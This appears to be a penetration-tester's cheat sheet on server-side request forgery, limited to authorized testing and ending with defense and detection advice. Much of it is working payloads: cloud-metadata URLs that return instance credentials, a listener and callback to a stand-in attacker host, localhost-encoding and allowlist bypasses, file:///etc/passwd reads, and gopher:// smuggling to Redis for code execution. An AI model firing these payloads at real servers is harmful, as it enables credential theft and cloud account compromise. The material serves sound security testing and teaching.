# Web — Server-Side Request Forgery (SSRF)

Making the server send HTTP(S) (or other-protocol) requests to a destination **you** choose. Scope: authorized web testing only. The server becomes your proxy into places you can't reach directly — cloud metadata, internal services on `127.0.0.1`/the private network, and internal APIs. Highest-value SSRF ends in cloud-credential theft or [RCE](RCE.md).

> Hitting cloud metadata or internal admin services can pull live credentials and reach other tenants — confirm scope. Pull creds to prove impact; don't pivot further into internal systems without written approval.

## Contents

- [Where it hides](#where-it-hides)
- [Types & confirm it](#types--confirm-it)
- [Cloud metadata (the big win)](#cloud-metadata-the-big-win)
- [Internal recon & port scan](#internal-recon--port-scan)
- [Filter / allowlist bypass](#filter--allowlist-bypass)
- [Protocol smuggling (gopher/dict/file)](#protocol-smuggling-gopherdictfile)
- [Tooling](#tooling)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## Where it hides

Any feature where the server fetches a URL you influence:

- URL/webhook fields, "import from URL", "fetch avatar/image by URL", PDF/screenshot/thumbnail generators.
- Link preview/unfurl, RSS/XML/SVG parsers (XXE → SSRF), file-upload "from URL".
- Parameters that *look* like URLs or hostnames: `url=`, `dest=`, `redirect=`, `host=`, `feed=`, `callback=`, `img=`, `domain=`.

## Types & confirm it

| Type | You get | Confirm with |
| --- | --- | --- |
| **Basic / in-response** | The fetched content is reflected back | Point it at your server, or at an internal page, and read the response |
| **Blind** | No content returned | Out-of-band callback (Burp Collaborator / interactsh) |

```bash
# 1. Point it at YOUR listener and watch for the hit (proves SSRF + reveals egress IP/UA)
#    attacker:  nc -lvnp 80     (or use a Collaborator/interactsh URL)
url=http://ATTACKER-COLLAB/ssrf-test

# 2. Basic SSRF: aim at the app's own loopback — different response = internal fetch works
url=http://127.0.0.1/            url=http://localhost/admin
```

Expected callback on your listener confirms it, and shows the source IP (often an internal/cloud egress) and User-Agent (the server's HTTP client, e.g. `python-requests`, `curl`, `Go-http-client` — tells you the stack):

```text
$ nc -lvnp 80
Connection from 203.0.113.9                      # the server's egress IP
GET /ssrf-test HTTP/1.1
User-Agent: python-requests/2.31.0               # fetcher = Python -> no gopher via requests
Host: ATTACKER-COLLAB
```

## Cloud metadata (the big win)

Internal link-local endpoint `169.254.169.254` serves instance credentials. Reaching it from SSRF usually means cloud account compromise.

```bash
# AWS (IMDSv1 — no token needed)
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/            # -> role name
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE        # -> AccessKey/Secret/Token
url=http://169.254.169.254/latest/user-data                                       # often has secrets/scripts

# AWS IMDSv2 (needs a token header first — SSRF must allow setting headers / PUT)
#   PUT http://169.254.169.254/latest/api/token  with header X-aws-ec2-metadata-token-ttl-seconds: 21600
#   then GET with header X-aws-ec2-metadata-token: <token>

# GCP (requires the Metadata-Flavor header)
url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
#   header: Metadata-Flavor: Google
#   alt host that sometimes bypasses filters: metadata.google.internal

# Azure (requires Metadata: true header)
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
url=http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/
```

```text
# AWS creds response -> use with awscli:  aws sts get-caller-identity
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

Then enumerate the cloud account with those creds (S3, more instances, secrets manager). If the SSRF can't add headers, IMDSv2/GCP/Azure may be out of reach — IMDSv1 AWS is the easy case.

## Internal recon & port scan

```bash
url=http://127.0.0.1:8080/        url=http://127.0.0.1:6379/     # app admin, Redis, etc.
url=http://169.254.169.254/       url=http://10.0.0.5:9200/      # metadata, internal Elasticsearch

# Port scan by response/timing differences — script the port in your fuzzer
url=http://127.0.0.1:PORT/        # open: fast/connection response | closed: refused/timeout
```

Distinguish open vs closed by **status code, response length, or time**. Common internal targets: Redis (6379), Memcached (11211), Elasticsearch (9200), Kubernetes API/kubelet (6443/10250), databases, internal admin panels, CI.

## Filter / allowlist bypass

```bash
# Alternate localhost representations
http://127.0.0.1    http://localhost   http://127.1   http://0.0.0.0   http://[::1]   http://0177.0.0.1 (octal)
http://2130706433/            # 127.0.0.1 as a decimal int
http://0x7f.0x0.0x0.0x1/      # hex octets

# Trick the parser (allowlist expects "trusted.com")
http://trusted.com@127.0.0.1/         # userinfo — real host is after @
http://127.0.0.1#trusted.com          # fragment
http://trusted.com.ATTACKER.com/      # your domain, allowlist substring match
http://ATTACKER.com/redir -> 302 to http://169.254.169.254/   # open-redirect / your 302

# DNS rebinding: a name that resolves to your IP on first lookup, 127.0.0.1 on the second
#   (defeats "resolve, check, then fetch" validators) — use a rebinding service

# Encoding / enclosed alphanumerics, added dots, trailing dot:  http://169.254.169.254./
```

## Protocol smuggling (gopher/dict/file)

If the fetcher honors non-HTTP schemes (`curl`-based backends often do; `requests` does not), you can talk to raw TCP services and read local files.

```bash
file:///etc/passwd                     # read a local file
dict://127.0.0.1:6379/INFO             # one-line probe of a text protocol (Redis/Memcached banner)

# gopher:// = send arbitrary bytes to a TCP port -> craft a full protocol exchange
#   e.g. write a Redis key (set a cron via Redis, or poison a session) — build it with Gopherus:
gopher://127.0.0.1:6379/_%2A1%0D%0A...   # URL-encoded Redis command stream
```

`gopher://` to Redis/MySQL/SMTP/FastCGI is the classic SSRF → RCE path (write a cron job or webshell). Generate the payloads with **Gopherus** rather than hand-crafting.

## Tooling

- **[SSRFmap](https://github.com/swisskyrepo/SSRFmap)** — automates metadata grab, port scan, gopher payloads from a saved request with the SSRF point marked.
- **[Gopherus](https://github.com/tarunkant/Gopherus)** — builds `gopher://` payloads for Redis, MySQL, Postgres, SMTP, FastCGI, Zabbix.
- **interactsh / Burp Collaborator** — the out-of-band listener for blind SSRF.
- **Burp** — manual testing + its Collaborator client; `param miner` to find hidden URL params.

## Defense / detection (for the report)

- **Allowlist** the destination host/scheme/port (positive list), not a blocklist — and validate **after** DNS resolution against the resolved IP to stop rebinding.
- **Block link-local & private ranges** (`169.254.0.0/16`, `127.0.0.0/8`, RFC1918, `::1`) at the app and egress firewall.
- **Disable unused URL schemes** — allow only `http`/`https`; never `file`/`gopher`/`dict`/`ftp`.
- **Don't follow redirects** blindly (re-validate each hop); strip/limit response reflection.
- **Enforce IMDSv2** (token-required) and set the metadata hop limit to 1; use workload identity instead of instance creds where possible.
- **Detect:** egress to `169.254.169.254` or RFC1918 from app servers that shouldn't; outbound to unexpected ports; metadata hits in cloud flow logs; the app's HTTP-client UA reaching internal hosts.

## Related

[Web Overview](Web%20Overview.md) · [RCE](RCE.md) (gopher→Redis/FastCGI) · [Networking Overview](../Networking/Networking%20Overview.md) (internal pivoting)
